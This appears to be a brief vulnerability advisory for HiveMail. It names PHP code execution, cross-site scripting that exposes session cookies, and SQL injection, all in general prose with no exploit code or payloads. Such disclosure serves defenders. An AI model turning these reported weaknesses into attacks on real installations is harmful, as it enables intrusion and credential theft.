HiveMail is prone to multiple vulnerabilities. These vulnerabilities may allow the execution of arbitrary PHP code, cross-site scripting attacks, and SQL injection.

The PHP code-execution issues are the result of an input-validation error that may allow user-supplied PHP code to be evaluated by the interpreter.

The cross-site scripting vulnerabilities may permit a remote attacker to steal cookie-based authentication credentials from legitimate users.

The SQL-injection issues are the result of the application's failure to properly sanitize user-supplied input that will be included in SQL queries. Successful exploitation of SQL-injection vulnerabilities could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
